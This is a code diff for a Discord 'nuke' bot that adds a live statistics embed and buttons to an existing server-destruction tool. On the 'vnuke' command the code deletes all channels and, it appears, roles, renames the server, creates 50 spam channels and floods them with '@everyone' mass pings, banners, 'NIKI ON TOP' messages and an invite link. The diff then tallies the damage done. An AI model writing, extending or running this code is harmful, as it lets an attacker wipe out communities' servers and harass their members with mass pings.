@@ -1,5 +1,5 @@
 ﻿require('dotenv').config();
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 
 const client = new Client({
     intents: [
@@ -13,6 +13,16 @@ const client = new Client({
 
 const PREFIX = process.env.PREFIX || '!';
 const AUTHORIZED_ID = "1474433573174907054";
+
+// ============================================================
+// STATS
+// ============================================================
+let totalNukes = 0;
+let totalChannelsDeleted = 0;
+let totalRolesDeleted = 0;
+let totalChannelsCreated = 0;
+let statsChannelId = null;
+let statsMessageId = null;
 
 // ============================================================
 // ASCII BANNER
@@ -32,9 +42,6 @@ const ASCII_BANNER = `
 ╚═══════════════════════════════════════════════════════════╝
 `;
 
-// ============================================================
-// MESSAGES (SENT AFTER DELETION)
-// ============================================================
 const VICTORY_MESSAGES = [
     '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**\n\nTHIS SERVER HAS BEEN DESTROYED',
     '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**\n\n**NIKI ON TOP !**',
@@ -53,9 +60,6 @@ const HACKER_IMAGES = [
     'https://i.imgur.com/5VjN7pK.png'
 ];
 
-// ============================================================
-// CHANNEL NAMES (SCARY + NUMBERS)
-// ============================================================
 const SCARY_NAMES = [
     'N1K1-0N-T0P-01', 'N1K1-RUL3S-02', 'N1K1-K1NG-03', 'N1K1-G04T-04', 'N1K1-L3G3ND-05',
     'N1K1-W1NS-06', 'N1K1-D3STR0YS-07', 'N1K1-UNST0PP4BL3-08', 'N1K1-G0D-09', 'N1K1-0N-T0P-10',
@@ -70,15 +74,99 @@ const SCARY_NAMES = [
 ];
 
 const inviteLink = 'https://discord.gg/eVTU7sW3wv';
-let totalNukes = 0;
 
-client.once('ready', () => {
+// ============================================================
+// UPDATE STATS CHANNEL
+// ============================================================
+async function updateStatsChannel() {
+    if (!statsChannelId) return;
+
+    try {
+        const channel = await client.channels.fetch(statsChannelId);
+        if (!channel) return;
+
+        const embed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('☠ NIKI NUKE STATS ☠')
+            .setDescription('**BOT STATUS: ONLINE**\n🟢 **LIVE**')
+            .addFields(
+                { name: '💀 Total Nukes', value: `${totalNukes}`, inline: true },
+                { name: '🗑️ Channels Deleted', value: `${totalChannelsDeleted}`, inline: true },
+                { name: '🎭 Roles Deleted', value: `${totalRolesDeleted}`, inline: true },
+                { name: '📝 Channels Created', value: `${totalChannelsCreated}`, inline: true },
+                { name: '📊 Servers', value: `${client.guilds.cache.size}`, inline: true },
+                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+
+        const row = new ActionRowBuilder()
+            .addComponents(
+                new ButtonBuilder()
+                    .setLabel('🔄 Refresh Stats')
+                    .setStyle(ButtonStyle.Primary)
+                    .setCustomId('refresh_stats'),
+                new ButtonBuilder()
+                    .setLabel('💀 Nuke Stats')
+                    .setStyle(ButtonStyle.Danger)
+                    .setCustomId('nuke_stats')
+            );
+
+        if (statsMessageId) {
+            try {
+                const msg = await channel.messages.fetch(statsMessageId);
+                await msg.edit({ embeds: [embed], components: [row] });
+            } catch {
+                const msg = await channel.send({ embeds: [embed], components: [row] });
+                statsMessageId = msg.id;
+            }
+        } else {
+            const msg = await channel.send({ embeds: [embed], components: [row] });
+            statsMessageId = msg.id;
+        }
+    } catch (e) {
+        console.error('Error updating stats channel:', e);
+    }
+}
+
+// ============================================================
+// INTERACTIONS (Buttons)
+// ============================================================
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isButton()) return;
+
+    if (interaction.customId === 'refresh_stats') {
+        await interaction.deferUpdate();
+        await updateStatsChannel();
+        await interaction.followUp({ content: '✅ Stats refreshed!', ephemeral: true });
+    }
+
+    if (interaction.customId === 'nuke_stats') {
+        await interaction.deferUpdate();
+        const embed = new EmbedBuilder()
+            .setColor(0xFF0000)
+            .setTitle('☠ NUKE HISTORY ☠')
+            .setDescription(`Total Nukes: ${totalNukes}\nChannels Deleted: ${totalChannelsDeleted}\nRoles Deleted: ${totalRolesDeleted}\nChannels Created: ${totalChannelsCreated}`)
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+        await interaction.followUp({ embeds: [embed], ephemeral: true });
+    }
+});
+
+// ============================================================
+// READY EVENT
+// ============================================================
+client.once('ready', async () => {
     console.log(`✅ Connected as ${client.user.tag}`);
     console.log(`📊 ${client.guilds.cache.size} servers`);
     console.log(`🔧 Prefix: ${PREFIX}`);
     console.log('====================================');
+    await updateStatsChannel();
 });
 
+// ============================================================
+// MESSAGE COMMANDS
+// ============================================================
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.content.startsWith(PREFIX)) return;
 
@@ -88,8 +176,18 @@ client.on('messageCreate', async (message) => {
     if (command === 'vnuke') {
         await handleNuke(message);
     }
+
+    if (command === 'set') {
+        statsChannelId = message.channel.id;
+        statsMessageId = null;
+        await updateStatsChannel();
+        await message.reply('✅ Stats channel set!');
+    }
 });
 
+// ============================================================
+// NUKE FUNCTION
+// ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
         return message.reply('❌ You are not authorized to use this command!');
@@ -112,7 +210,7 @@ async function handleNuke(message) {
     let channelsCreated = 0;
 
     try {
-        // 1. DELETE ALL CHANNELS (INSTANT)
+        // 1. DELETE ALL CHANNELS
         const channels = guild.channels.cache;
         for (const [id, channel] of channels) {
             try {
@@ -138,7 +236,7 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS WITH MESSAGES
+        // 4. CREATE 50 NEW CHANNELS
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
             try {
@@ -147,7 +245,6 @@ async function handleNuke(message) {
                     type: ChannelType.GuildText,
                 });
                 
-                // Send all messages in each new channel
                 await channel.send('```' + ASCII_BANNER + '```');
                 await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                 await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
@@ -179,8 +276,14 @@ async function handleNuke(message) {
 
         // 6. UPDATE STATS
         totalNukes++;
+        totalChannelsDeleted += channelsDeleted;
+        totalRolesDeleted += rolesDeleted;
+        totalChannelsCreated += channelsCreated;
 
-        // 7. SEND DM WITH STATS
+        // 7. UPDATE STATS CHANNEL
+        await updateStatsChannel();
+
+        // 8. SEND DM WITH STATS
         const dmEmbed = new EmbedBuilder()
             .setColor(0xFF0000)
             .setTitle('☠ NUKE EXECUTED ☠')
